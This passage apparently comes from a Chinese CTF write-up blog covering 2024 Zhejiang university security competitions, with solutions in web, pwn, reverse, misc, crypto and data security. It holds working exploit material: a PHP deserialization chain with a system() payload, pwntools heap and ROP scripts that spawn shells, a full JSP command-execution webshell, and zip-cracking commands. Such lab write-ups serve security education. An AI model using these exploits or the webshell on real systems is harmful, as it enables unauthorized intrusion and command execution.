$this -> $value;\n        $var[$value]();\n    }\n}\n\nclass DDD{\n    public $bag;\n    public $magazine;\n\n    public function __toString()\n    {\n        $length = @$this -> bag -> add();\n        return $length;\n    }\n    public function __set($arg1,$arg2)\n    {\n        if($this -> magazine -> tower)\n        {\n            echo \"really??\";\n        }\n    }\n}\n\nclass EEE{\n    public $d=array();\n    public $e;\n    public $f;\n    public function __get($arg1){\n        $this->d[$this->e]=1;\n        if ($this->d[]=1){\n            echo 'nononononnnn!!!';\n            }\n        else{\n            eval($this->f);\n            }\n    }\n}\n\nclass FFF{\n    protected $cookie;\n\n    protected function delete() {\n        return $this -> cookie;\n    }\n\n    public function __call($func, $args) {\n        echo 'hahahhhh';\n        call_user_func([$this, $func.\"haha\"], $args);\n    }\n}\nclass GGG{\n    public $green;\n    public $book;\n    public function __invoke(){\n        if(md5(md5($this -> book)) == 666) {\n            return $this -> green -> pen;\n        }\n    }\n}\n\nif(isset($_POST['UP'])) {\n    unserialize($_POST['UP']);\n}\n```\n\n反序列化\n\n调用路径：\n`AAA::__destruct-->AAA::__toString-->GGG::__invoke-->EEE::__get`\n\n其中到`GGG`的时候需要爆破一下md5\n\n```python\n# -*- coding: utf-8 -*-\n\nimport multiprocessing\nimport hashlib\nimport random\nimport string\nimport sys\n\n\nCHARS = string.letters + string.digits\n\n\ndef cmp_md5(substr, stop_event, str_len, start=0, size=20):\n    global CHARS\n\n    while not stop_event.is_set():\n        rnds = ''.join(random.choice(CHARS) for _ in range(size))\n        md5 = hashlib.md5(rnds)\n        md5 = hashlib.md5(md5.hexdigest())\n\n        if md5.hexdigest()[start: start+str_len] == substr and md5.hexdigest()[3].isdigit()==False:\n            print rnds\n            stop_event.set()\n\n\nif __name__ == '__main__':\n    substr = sys.argv[1].strip()\n\n    start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0\n\n    str_len = len(substr)\n    cpus = multiprocessing.cpu_count()\n    stop_event = multiprocessing.Event()\n    processes = [multiprocessing.Process(target=cmp_md5, args=(substr, stop_event, str_len, start_pos)) for i in range(cpus)]\n\n    for p in processes:\n        p.start()\n\n    for p in processes:\n        p.join()\n```\n\n![](/img/wp/2024/2024-zjss-js-unserialize-1.png)\n\n\n`EEE`中的if用报错跳过即可\n\nexp：\n\n```php\n<?php\n\nclass GGG{\n    public $green;\n    public $book='g1xFqZRDDTyxafSIUSta';\n}\n\n\nclass AAA{\n    public $aear;\n    public $string;\n}\n\n\n\nclass EEE{\n    public $d=1;\n    public $e;\n    public $f=\"system('cat /flag.txt');\";\n}\n\n$a = new AAA();\n$a->aear = new AAA();\n$a->aear->string = new GGG();\n$a->aear->string->green = new EEE();\n\necho urlencode(serialize($a));\n\n//O%3A3%3A%22AAA%22%3A2%3A%7Bs%3A4%3A%22aear%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A4%3A%22aear%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A3%3A%22GGG%22%3A2%3A%7Bs%3A5%3A%22green%22%3BO%3A3%3A%22EEE%22%3A3%3A%7Bs%3A1%3A%22d%22%3Bi%3A1%3Bs%3A1%3A%22e%22%3BN%3Bs%3A1%3A%22f%22%3Bs%3A24%3A%22system%28%27cat+%2Fflag.txt%27%29%3B%22%3B%7Ds%3A4%3A%22book%22%3Bs%3A20%3A%22g1xFqZRDDTyxafSIUSta%22%3B%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D\n```\n\n\n![](/img/wp/2024/2024-zjss-js-unserialize-2.png)\n\n\n# misc\n\n## FinalSign\n\n附件是一个txt，存在snow特征，有大量的`20`，`09`\n\n![](/img/wp/2024/2024-zjss-js-FinalSign-1.png)\n\n用得到的key`helloworld`去xor txt中的字符串\n\n```python\na=bytes.fromhex('2c243f2f3b3114345d0a0909333f06100143023b2c55020912')\nkey=b'helloworld'\ne=[]\nfor i in range(0,len(a)):\n    e.append(a[i]^key[i%len(key)])\nprint(bytes(e))\n\n\n#b'DASCTF{F1nal_Sign1n_D0ne}'\n```\n\n\n\n## 非黑即白\n\n反转文件，得到一张gif\n\n```python\nwith open('非黑即白','rb') as f:\n   with open('1.gif','wb') as g:\n      g.write(f.read()[::-1])\n```\n\n将纯黑色的帧转为`0`，其他的转为`1`，得到一个加密的zip\n\n```python\nfrom PIL import Image\na=Image.open(\"1.gif\")\nn=0\ndata=\"\"\ne=[]\nwhile True:\n    try:\n        a.seek(n)\n        d=a.copy().convert('1').getdata()\n        if (d[0]==0):\n            data+='0'\n        else:\n            data+='1'\n    except:\n        break;\n    if (len(data)==8):\n        e.append(int(data,2))\n        data=''\n    n+=1\n\nf=open(\"data.zip\",'wb')\nf.write(bytes(e))\nf.close()\n```\n\nidentify查看帧间隔，发现前几帧的间隔不一致，提取出来转成字符串\n\n```bash\nroot@lewiserii:~# identify -format \"%s %T \\n\" 2.gif\n0 118\n1 106\n2 69\n3 74\n4 48\n5 98\n6 83\n7 117\n8 77\n9 79\n10 86\n11 65\n12 90\n13 103\n14 101\n```\n\n```python\na=[118,106,69,74,48,98,83,117,77,79,86,65,90,103,101]\nprint(bytes(a))\n\n#b'vjEJ0bSuMOVAZge'\n```\n\n解压得到flag `DASCTF{H3r3_1s_C0L0rful_W0rld}`\n\n\n\n## 天命人\n\n按照黑猴的章节名排序\n\n```txt\n火照黑云\n风起黄昏\n夜生白露\n曲度紫鸳\n日落红尘\n未竟\n```\n\n发现按照顺序取一个字节是`50 4b 03 04 00 0a`\n\npython提取出来\n\n```python\nfile_list = ['火照黑云', '风起黄昏', '夜生白露', '曲度紫鸳', '日落红尘', '未竟']\nsources = [open(file_name, 'rb') for file_name in file_list]\nn = 0\nwith open('1.zip', 'wb') as target:\n    while n < 0x5ead4:\n        bytes_read = [source.read(1) for source in sources]\n\n        for byte in bytes_read:\n            if byte:\n                target.write(byte)\n        n += 1\n\n```\n\n7-zip打开可以看到另一个zip\n\n![](/img/wp/2024/2024-zjss-js-天命人-1.png)\n\n\n其中 根器.zip 很明显进行crc32爆破\n\n![](/img/wp/2024/2024-zjss-js-天命人-2.png)\n\n```bash\nC:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破>python crc32.py reverse 0x76899D01\n4 bytes: C0M3 {0x43, 0x30, 0x4d, 0x33}\nverification checksum: 0x76899d01 (OK)\n\n\nC:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破>python crc32.py reverse 0x8E036AA6\n4 bytes: _4ND {0x5f, 0x34, 0x4e, 0x44}\nverification checksum: 0x8e036aa6 (OK)\n\n\nC:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破>python crc32.py reverse 0x881D716A\n4 bytes: _Get {0x5f, 0x47, 0x65, 0x74}\nverification checksum: 0x881d716a (OK)\n\n\nC:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破>python crc32.py reverse 0x7F3D8E75\n4 bytes: _S1X {0x5f, 0x53, 0x31, 0x58}\nverification checksum: 0x7f3d8e75 (OK)\n\n\nC:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破>python crc32.py reverse 0x248D3C69\n4 bytes: _R00 {0x5f, 0x52, 0x30, 0x30}\nverification checksum: 0x248d3c69 (OK)\n\n\nC:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破>python crc32.py reverse 0xCB27D2BD\n4 bytes: TS!! {0x54, 0x53, 0x21, 0x21}\nverification checksum: 0xcb27d2bd (OK)\n```\n\n\n得到密码`C0M3_4ND_Get_S1X_R00TS!!`，解密 未竟.zip\n\n提取`金箍棒.png`上的像素点\n\n```python\nfrom PIL import Image\n\na = Image.open(\"金箍棒.png\")\nx, y = 5, 5\nx_, y_ = 0, 0\nw, h = a.size\nb = Image.new(a.mode, (w // 10, h // 10))\n\nfor x in range(5, w, 10):\n    for y in range(5, h, 10):\n        print(x, y, x_, y_)\n        b.putpixel((x_, y_), a.getpixel((x, y)))\n        y_ += 1\n    x_ += 1\n    y_ = 0\nb.save('1.png')\n```\n\n得到`verapass1:jinggubang`\n\n![](/img/wp/2024/2024-zjss-js-天命人-3.png)\n\n用照片作为密钥文件同时使用密码挂载得到flag\n\n![](/img/wp/2024/2024-zjss-js-天命人-4.png)\n\n`DASCTF{T1m3_t0_F4Ce_De5t1nY}`\n\n# reverse\n\n## Reverse2\n\n`upx` 加密，但抹了特征，修改一下就行\n\n![](/img/wp/2024/2024-zjss-js-Reverse2-1.png)\n\n然后用命令解密\n\n```bash\nupx -d Reverse2.exe\n```\n\n打开就是 `base64` 换表\n\n![](/img/wp/2024/2024-zjss-js-Reverse2-2.png)\n\n\n\n## Reverse1\n\n先使用标准rc4加密密钥\n之后使用魔改的rc4加密明文\n\n```python\nclass rc4():\n    def toBytes(self,data):\n        if type(data)==str:\n            return data.encode()\n        elif type(data)==bytes:\n            return data\n        else:\n            raise Exception(\"data Type Error\")\n\n    def GetKey(self,data):\n        k=[]\n        k1=[]\n        data_l=len(data)\n        for i in range(256):\n            k.append(i)\n            k1.append(data[i%data_l])\n        n=0\n        for i in range(256):\n            n=(k1[i]+n+k[i])&0xff\n            n1=k[i]\n            k[i]=k[n]\n            k[n]=n1\n        return k\n\n    def Cipher(self,data):\n        data=self.toBytes(data)\n        enc=[]\n        k=self.Key.copy()\n        n=0\n        n1=0\n        tmp=0\n        for i in range(len(data)):\n            n=(n+1)&0xff\n            n1=(n1+k[n])&0xff\n            tmp=k[n]\n            k[n]=k[n1]\n            k[n1]=tmp\n            enc.append((data[i]+k[(k[n]+k[n1])%256])&0xff)\n        return bytes(enc)\n\n\n    def __init__(self,key):\n        key=self.toBytes(key)\n        self.Key=self.GetKey(key)\n        self.__Key=key\n\n    def SetKey(self,key):\n        key=self.toBytes(key)\n        self.Key=self.GetKey(key)\n        self.__Key=key\n\n\nk=bytes.fromhex(\"690d5ab240ea193f2f6a\")\nd=[0x4E, 0x47, 0x38, 0x47, 0x62, 0x0A, 0x79, 0x6A, 0x03, 0x66, 0xC0, 0x69, 0x8D, 0x1C, 0x84, 0x0F, 0x54, 0x4A, 0x3B, 0x08, 0xE3, 0x30, 0x4F, 0xB9, 0x6C, 0xAB, 0x36, 0x24, 0x52, 0x81, 0xCF]\nr=rc4(bytes(k))\ne=r.Cipher(bytes(d))\nprint(e)\n```\n\n\n\n# pwn\n\n## ezPwn\n\n直接利用`tcache bin`在`0x4180`地址处创建`chunk`，并写入构造好的数据，就可以获取flag\n\n```python\nfrom pwn import *\n\n\ncontext.arch='amd64'\ndef add(size,data=b'\\n'):\n    p.sendlineafter(b'exit',b'1')\n    p.sendlineafter(b\"size>>\",str(size).encode())\n    p.sendafter(\"data>>\",data)\ndef edit(ind,data):\n    p.sendlineafter(b'exit',b'2')\n    p.sendlineafter(b'index>>',str(ind).encode())\n    p.sendafter(\"data>>\",data)\n\ndef show(ind):\n    p.sendlineafter(b'exit',b'3')\n    p.sendlineafter(b'index>>',str(ind).encode())\n    p.readuntil(b'data>>\\n')\ndef free(ind):\n    p.sendlineafter(b'exit',b'4')\n    p.sendlineafter(b'index>>',str(ind).encode())\ndef exit():\n    p.sendlineafter(b'exit',b'5')\ndef getflag():\n    p.sendlineafter(b'exit',b'6')\n\ndef calc(data):\n    mark=0xfff000000000\n    data1=data&mark\n    result=0\n    result|=data1\n    for i in range(3):\n        data1=((data1>>12)^data)&(mark>>12)\n        result|=data1\n        mark=mark>>12\n    return result\n    pass\ne=ELF(\"./pwn\")\n\n#p=process(\"./pwn\")\np=remote('10.1.197.36',9999)\np.readuntil(b'gift:\\n')\ne.address=int(p.readline(),16)-0x1a44\n#gdb.attach(p)\nadd(0x400)\nadd(0x400)\nadd(0x400)\nfree(0)\nfree(1)\nfree(2)\nshow(1)\nd=u64(p.read(8))\nprint(hex(d))\nd=calc(d)\nprint(hex(d))\n_4180=e.address+0x4180\n\nedit(1,p64(_4180^((d+0x410)>>12)))\nadd(0x400)\nadd(0x400)\nadd(0x400)\npayload=p32(0xf0)*10\nedit(5,payload)\np.sendline('6')\np.interactive()\n```\n\n## printFFF\n\n题目允许写入0x15字节的shellcode，但是不够获取shell\n所以利用`exit`的`got`表第二次写shellcode，并在第一次shellcode中设置一些环境\n这样第二次shellcode就可以直接调用`system(\"sh\")`来获取shell\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\nshellcode=\"\"\"\nmov edi,0x404800\nmov eax,0x6873\nmov [rdi],rax\npop rdi\nsub rdi,0x6D\njmp rdi\n\"\"\"\nshellop=asm(shellcode)\nprint(hex(len(shellop)))\n#exit()\ne=ELF(\"./pwn\")\n#p=process(\"./pwn\")\np=remote(\"10.1.197.38\",9999)\n#gdb.attach(p,'bp 0x4010E0')\n\np.send(shellop)\npause()\nexit_=e.got['exit']\np.send(p64(0x405000)+p64(exit_)+p64(4))\np.interactive()\nshellcode=\"\"\"\nmov edi,0x404800\nmov rax,[0x404030]\nsub rax,0xc3a60\njmp rax\n\"\"\"\nshellop=asm(shellcode)\nprint(hex(len(shellop)))\n\np.send(shellop)\npause()\nexit_=e.got['exit']\np.send(p64(0x405000)+p64(exit_)+p64(4))\npause()\np.interactive()\n```\n\n\n## reverse_stack\n\n在程序扩展栈空间的时候存在整数溢出，让下一个函数的栈在当前函数的前面，就可以实现修改程序流\n通过修改程序流让程序第二次使用mmap创建第二个栈\n这两个栈是连续的，这样在第一次调用函数时写入的栈地址就在程序栈的中间，就可以获取栈中的数据，比如libc_start_main的地址\n之后就可以构造rop链获取shell\n\n```python\nfrom pwn import *\n#context.log_level='debug'\n\ndef l(size):\n    p.sendafter('long?\\n',p64(size&(0xffffffffffffffff)))\n\ndef d(data):\n    p.sendafter('buf\\n',data)\n\ndef pill(n):\n    if n:\n        p.sendafter('pill?\\n',b'red'.ljust(8,b'\\x00'))\n    else:\n        p.sendafter('pill?\\n',b'blue'.ljust(8,b'\\x00'))\n\n\np=remote(\"10.1.197.37\",9999)\n#p=process('./pwn')\ne=ELF(\"./pwn\")\n#pause()\nl(0x40)\nd('asdfadsf')\npill(1)\nl(0x400)\nd(b'\\x87')\npill(0)\nl(0x58)\nd('asdfasdf')\np.read(0x40)\nd_=u64(p.read(8))\nd_=u64(p.read(8))\nprint(hex(d_))\ne.address=d_-0x1233\nd_=u64(p.read(8))\nprint(hex(d_))\nstack=d_&(-0x1000)\npill(1)\nfor i in range(10):\n    l(0x400)\n    d('asdfadsf')\n    pill(1)\n\nl(-0x400)\npill(1)\nl(0x500)\npayload=b'a'*0x3c8+p64(e.address+0x1050)+p64(stack+0x5000)\nd(payload)\np.readuntil('pill?\\n')\np.send(b'blue'.ljust(8,b'\\x00'))\n\nfor i in range(0x102):\n    l(0x1f0)\n    d('asd')\n    pill(1)\nl(-0x400)\npill(1)\nl(0x500)\n\npayload=b'a'*0x3c8+p64(e.address+0x11CE)+p64(stack-0x78)\nd(payload)\np.readuntil('pill?\\n')\np.send(b'blue'.ljust(8,b'\\x00'))\np.read(0x70)\nd_=u64(p.read(8))\nprint(hex(d_))\nreal_stack=d_\n\npill(1)\nl(-0x400)\npill(1)\nl(0x1f0)\nd('rotwill')\n\npill(1)\nl(0x500)\n\npayload=b'a'*(0x3c8-33*0x10)+p64(e.address+0x11ce)+p64(real_stack-0x4d0-8)\nd(payload)\np.readuntil('pill?\\n')\np.send(b'blue'.ljust(8,b'\\x00'))\np.read(0x4d0)\nd_=u64(p.read(8))\nprint(hex(d_))\npause()\npill(1)\n#p.interactive()\n\nlibc=ELF(\"./libc.so.6\")\nlibc.address=d_-0x29d90\n\ngadget=libc.address+0xebc81\nl(-0x400)\npill(1)\nl(0x500)\nsystem=libc.sym['system']\nrdi=0x000000000002a3e5+libc.address\nbin_sh=next(libc.search(b'/bin/sh\\x00'))\nret=rdi+1\n#gdb.attach(p,'bp $rebase(0x1228)\\nc')\n#pause()\npayload=b'a'*(0x3c8)+p64(ret)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(stack+0x18000)\nd(payload)\np.readuntil('pill?\\n')\np.send(b''.ljust(8,b'\\x00'))\n\np.interactive()\n```\n\n\n# 数据安全\n\n## datasecurity_classify1\n\n```python\nfrom string import ascii_letters\nimport os\nphone_prefix = [\n    734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772,\n    778, 782, 783, 784, 787, 788, 795, 798, 730, 731, 732, 740, 745, 746, 755,\n    756, 766, 767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774, 777,\n    780, 781, 789, 790, 791, 793, 799\n]\nid_card_xishu = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]\nodd = \"1 0 X 9 8 7 6 5 4 3 2\".split(' ')\nif os.path.exists('result.csv'):\n    os.remove('result.csv')\nwith open('result.csv','+a') as result:\n    result.write('类型,数据值\\n');\n    with open('data.csv','rb') as data:\n        for line in data.readlines():\n            line = line.decode().strip();\n            if len(line) == 18:\n                # id card\n                qian_17 = line[:17]\n                sums = 0;\n                for i,e in enumerate(qian_17):\n                    e = int(e) * id_card_xishu[i];\n                    sums += e;\n                if line[-1] != odd[sums % 11]:\n                    continue;\n                result.write('身份证号,'+line + '\\n');\n            elif len(line) == 11:\n                for prefix in phone_prefix:\n                    if line.startswith(str(prefix)):\n                        result.write('手机号,'+line + '\\n');\n                        break;\n            else:\n                if '数据值' in line:\n                    continue;\n                # name\n                sign = False;\n                for i in ascii_letters:\n                    if i in line:\n                        sign = True;\n                        break;\n                if not sign:\n                    result.write('姓名,'+line + '\\n');\n```\n\n\n\n## datasecurity_classify2\n\n\n先用`tshark`提取数据\n\n```bash\ntshark -r data.pcapng -T felds -Y \"http.request.method==POST\" -e data\n```\n\n除了文档中的要求外注意处理ip的范围\n\n```python\ndef veryifyIdCard(idcard):\n    if len(idcard) != 18:\n        return False;\n    idcardList.append(idcard)\n    idcard = idcard.upper()\n    id_card_xishu = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]\n    odd = \"1 0 X 9 8 7 6 5 4 3 2\".split(' ')\n    sums = 0;\n    qian_17 = idcard[:17]\n    for i,e in enumerate(qian_17):\n        e = int(e) * id_card_xishu[i];\n        sums += e;\n\n    return idcard[-1] == odd[sums % 11];\n\ndef verifyPhone(phone):\n    phone_prefix = [\n        734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772, 778,\n        782, 783, 784, 787, 788, 795, 798, 730, 731, 732, 740, 745, 746, 755, 756, 766,\n        767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774, 777, 780, 781, 789,\n        790, 791, 793, 799\n    ]\n    if len(phone) != 11 or phone[-1] == 'X':\n        return False;\n    for prefix in phone_prefix:\n        if phone.startswith(str(prefix)):\n            return True;\n    return False;\n\ndef verifyIp(ip):\n    for i in ip.split('.'):\n        if int(i) > 255:\n            return False;\n    return True;\n\ndef cleanData(data):\n    if '-' in data:\n        data = ''.join(data.split('-'))\n    elif ' ' in data:\n        data = ''.join(data.split(' '))\n\n    return data;\n\n\n\nimport re,os\nipMatch = re.compile(r'[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}');\nphoneMatch = re.compile('(\\d{11}|\\d{3}\\ \\d{4}\\ \\d{4}|\\d{3}\\-\\d{4}\\-\\d{4})');\nidcardMatch = re.compile('(\\d{18}|\\d{6}\\ \\d{8}\\ \\d{4}|\\d{6}\\-\\d{8}\\-\\d{4})');\nidcardMatch_with_x = re.compile('(\\d{17}X|\\d{6}\\ \\d{8}\\ \\d{3}X|\\d{6}\\-\\d{8}\\-\\d{3}X)');\n\nidcardList = []\n\nif os.path.exists('result2.csv'):\n    os.remove('result2.csv')\nwith open('result2.csv','+a') as result:\n    result.write('category,value\\n');\n    with open('data.dat', 'r') as data:\n        data2 = bytes.fromhex(data.read()).decode();\n        for line in data2.split(','):\n            if idcardMatch.findall(line):\n                for e in idcardMatch.findall(line):\n                    e = cleanData(e);\n                    if veryifyIdCard(e):\n                        result.write('idcard,' + e + '\\n');\n            if idcardMatch_with_x.findall(line):\n                for e in idcardMatch_with_x.findall(line):\n                    e = cleanData(e);\n                    if veryifyIdCard(e):\n                        result.write('idcard,' + e + '\\n');\n            if phoneMatch.findall(line):\n                for e in phoneMatch.findall(line):\n                    e = cleanData(e);\n                    sign = True;\n                    for card in idcardList:\n                        if e in card:\n                            sign = False;\n                            break;\n                    if not sign:\n                        continue;\n                    if verifyPhone(e):\n                        result.write('phone,' + e + '\\n');\n            if ipMatch.findall(line):\n                for e in ipMatch.findall(line):\n                    if verifyIp(e):\n                        result.write('ip,' + e + '\\n');\n```\n\n![](/img/wp/2024/2024-zjss-js-datasecurity_classify2-1.png)\n\n\n# crypto\n\n## MyCode\n\n根据加密内容生成key并爆破即可\n\n```python\nimport numpy as np\n\n\ndef substitute(state, sub_box):\n    return [sub_box[b & 0xF] | (sub_box[(b >> 4) & 0xF] << 4) for b in state]\n\n\ndef generate_round_keys(base_key, rounds):\n    round_keys = []\n    temp_key = base_key\n    for _ in range(rounds):\n        round_keys.append(temp_key & 0xFFFFFFFF)\n        temp_key ^= ((temp_key << 1) & 0xFFFFFFFF) | ((temp_key >> 31) & 0x1)\n    return round_keys\n\n\ndef process_state(base_key, state, rounds, encrypt):\n    sub_box = [0x9, 0x4, 0xA, 0xB, 0xD, 0x1, 0x8, 0x5, 0x6, 0x2, 0x0, 0x3, 0xC, 0xE, 0xF, 0x7]\n    inv_sub_box = [0xA, 0x5, 0x9, 0xB, 0x1, 0x7, 0x8, 0xF, 0x6, 0x0, 0x2, 0x3, 0xC, 0x4, 0xD, 0xE]\n\n    round_keys = generate_round_keys(base_key, rounds)\n\n    if encrypt:\n        for round in range(rounds):\n            state = substitute(state, sub_box)\n            state = [s ^ ((round_keys[round] >> (i * 8)) & 0xFF) for i, s in enumerate(state)]\n    else:\n        for round in range(rounds - 1, -1, -1):\n            state = [s ^ ((round_keys[round] >> (i * 8)) & 0xFF) for i, s in enumerate(state)]\n            state = substitute(state, inv_sub_box)\n\n    return state\n\n\ndef encrypt(plaintext, key, rounds=10):\n    length = len(plaintext)\n    padded_length = length if length % 4 == 0 else length + (4 - (length % 4))\n    plaintext += b'\\x00' * (padded_length - length)\n\n    ciphertext = bytearray(padded_length)\n    for i in range(0, padded_length, 4):\n        state = list(plaintext[i:i + 4])\n        state = process_state(key, state, rounds, True)\n        ciphertext[i:i + 4] = state\n\n    return ciphertext\n\n\ndef decrypt(ciphertext, key, rounds=10):\n    length = len(ciphertext)\n    plaintext = bytearray(length)\n    for i in range(0, length, 4):\n        state = list(ciphertext[i:i + 4])\n        state = process_state(key, state, rounds, False)\n        plaintext[i:i + 4] = state\n\n    return plaintext.rstrip(b'\\x00')\n\n\ndef main():\n    # plaintext = b\"DASCTF{******}\"\n    # key = 0xECB... # 4 bytes\n    # ciphertext = encrypt(plaintext, key)\n    # print(\"Ciphertext:\", ''.join(f\"{b:02X}\" for b in ciphertext))\n\n    Ciphertext = 'A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401'\n    Ciphertext = bytes.fromhex(Ciphertext)\n\n    for i in range(0xFFFFF + 1):\n        key = 0xecb00000 + i\n        re = decrypt(Ciphertext, key)\n        print(re)\n        if b'DAS' in re:\n            break\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n![](/img/wp/2024/2024-zjss-js-MyCode-1.png)\n\n\n# 信创安全\n\n## OH\n\n\n\napp会在点击事件中对输入进行加密，将加密之后的数据与`/aPR+E8wS9+XbFMUfm8NacHpP190pf5xaR8+MIm/8gw=`进行比较\n\n![](/img/wp/2024/2024-zjss-js-OH-1.png)\n\n\n程序加密的调用流程为`encrypt->encryptX->encryptY->encodeX->encodeY`\n\n![](/img/wp/2024/2024-zjss-js-OH-2.png)\n\n![](/img/wp/2024/2024-zjss-js-OH-3.png)\n\n![](/img/wp/2024/2024-zjss-js-OH-4.png)\n\n分析初始化函数发现，加密使用的密钥相同，为`DASCTF2024-OHAPP`，`encryptX`为aes-128|ecb加密，`encryptY`为aes-128|cbc加密\n\n分析encryptY，发现疑似使用encryptX的结果作为cbc的iv\n程序将明文从中间分为两个十六位字符串，前十六位进行encryptX加密，后十六位进行encryptY加密\n\n![](/img/wp/2024/2024-zjss-js-OH-5.png)\n\n\n\n![](/img/wp/2024/2024-zjss-js-OH-6.png)\n\n![](/img/wp/2024/2024-zjss-js-OH-7.png)\n\n\n\n\n# 签到\n\n## 网安知识大挑战-FINAL\n\n简单的问题，直接做了\n\n`DBCCCCBCDB`\n\n根据提示用Triple DES解密得到flag\n\n![](/img/wp/2024/2024-zjss-js-网安知识大挑战-FINAL-1.png)","tags":["wp","2024竞赛","浙江"],"categories":["wp"]},{"title":"第七届浙江省大学生网络与信息安全竞赛预赛-WP","url":"/posts/42d6129/","content":"\n\n\n# 签到\n\n## 网安知识大挑战\n\n数据存储在js中\n\n![](/img/wp/2024/2024-zjss-cs-网安知识大挑战-2.png)\n\naes解密得到flag\n\n![](/img/wp/2024/2024-zjss-cs-网安知识大挑战-1.png)\n\n\n## 签到题\n\n```txt\nBase92 -> Base85 -> Base64 -> Base62 -> Base58 -> Base45 -> Base32\n```\n\n`DASCTF{welcome_to_zjctf_2024}`\n\n\n# web\n\n## hack memory\n\n访问`/robot.txt`得到`/upload`路径\n\n没有限制，直接上传一个小马\n\n```jsp\n<%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%>\n<%!public static String excuteCmd(String c)\n{\n    StringBuilder line = new StringBuilder();\ntry\n{\n    Process pro = Runtime.getRuntime().exec(c);\n    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));\n    String temp = null;\n    while ((temp = buf.readLine()) != null)\n    {\n        line.append(temp+\"\\\\n\");\n    }\n    buf.close();\n}\ncatch (Exception e)\n{\n    line.append(e.getMessage());\n}\nreturn line.toString();\n}\n%>\n<%\nif(\"023\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\")))\n{\n    out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\"))+\"</pre>\");\n}\nelse\n{\n    out.println(\":-)\");\n}\n%>\n```\n\nflag内容需要再base64一次\n\n![](/img/wp/2024/2024-zjss-cs-hack%20memory-1.png)\n\n\n## easyjs\n\n```js\nconst express = require('express');\nconst _ = require('lodash');\nconst fs = require('fs');\nconst app = express();\n\napp.use(express.json());\n\n// 存储笔记的对象\nconst notes = {};\n\n// 创建新笔记\napp.post('/api/notes', (req, res) => {\n    const noteId = req.body.id;\n    const noteData = req.body;\n\n    if (!noteId) {\n        return res.status(400).json({ error: 'Missing id' });\n    }\n\n    // 使用lodash.merge，该版本存在原型链污染漏洞\n    notes[noteId] = {};\n    _.merge(notes[noteId], noteData);\n    console.log('Note prototype:', Object.getPrototypeOf(notes[noteId]));\n    console.log('Note properties:', notes[noteId]);\n    res.json(notes[noteId]);\n});\n\n// 获取笔记\napp.get('/api/notes/:id', (req, res) => {\n    const noteId = req.params.id;\n\n    if (!notes[noteId]) {\n        return res.status(404).json({ error: 'Note not found' });\n    }\n\n    res.json(notes[noteId]);\n});\n\n// 获取flag (仅管理员可访问)\napp.get('/api/flag', (req, res) => {\n    const noteId = req.headers['note-id'];\n\n    if (!noteId || !notes[noteId]) {\n        return res.status(403).json({ error: 'Authentication required' });\n    }\n\n    if (!notes[noteId].isAdmin) {\n        return res.status(403).json({ error: 'Admin access required' });\n    }\n\n    try {\n        const flag = fs.readFileSync('/flag', 'utf8');\n        res.json({ flag: flag.trim() });\n    } catch (err) {\n        res.status(500).json({ error: 'Error reading flag' });\n    }\n});\n\napp.listen(8000, () => {\n    console.log('Server running on port 8000');\n});\n```\n\n先创建一个笔记，isAdmin设为true\n\n```json\n{\"id\":1,\"isAdmin\":true}\n```\n\n![](/img/wp/2024/2024-zjss-cs-easyjs-1.png)\n\n\n访问`/api/flag`的时候将note-id设为1即可得到flag\n\n![](/img/wp/2024/2024-zjss-cs-easyjs-2.png)\n\n\n\n\n# misc\n\n## RealSignin\n\n\n图片尾数据`dEFfc1dGq1pxMgMWnihrMx9mewNgdvIWMvctrc`\n\nstegsolve 0通道得到base码表\n\n`ABCDEFGHIJKLMNabcdefghijklmnopqrstuvwxyzOPQRSTUVWXYZ0123456789+/`\n\nbase64换表得到flag\n\n![](/img/wp/2024/2024-zjss-cs-RealSignin-1.png)\n\n\n## 机密文档\n\n简单爆破无果，尝试明文攻击\n\n```bash\necho -n \"the_secret_you_never_ever_know_hahahaha\" > plain.out\n./bkcrack -C 1.zip -c the_secret_you_never_ever_know_hahahaha.zip -p plain.out -o 30 -x 0 504B030414000000\n\n./bkcrack -C 1.zip -k b8edf1ff c1f93a7e f93d08e0 -U 2.zip dr0n1\n```\n\n![](/img/wp/2024/2024-zjss-cs-机密文档-1.png)\n\n\n解压后得到一个dom文件，其中有一个名为key的vba宏代码\n\n```vba\nSub key()\n    Dim decValues As Variant\n    Dim str As String\n    Dim result As String\n    Dim i As Integer\n    Dim xorValue As Integer\n\n    decValues = Array(26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3)\n    str = \"outguess\"\n    result = \"\"\n\n    For i = LBound(decValues) To UBound(decValues)\n        xorValue = decValues(i) Xor Asc(Mid(str, (i Mod Len(str)) + 1, 1))\n        result = result & Chr(xorValue)\n    Next i\n\nEnd Sub\n```\n\n解密\n\n```python\na=[26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 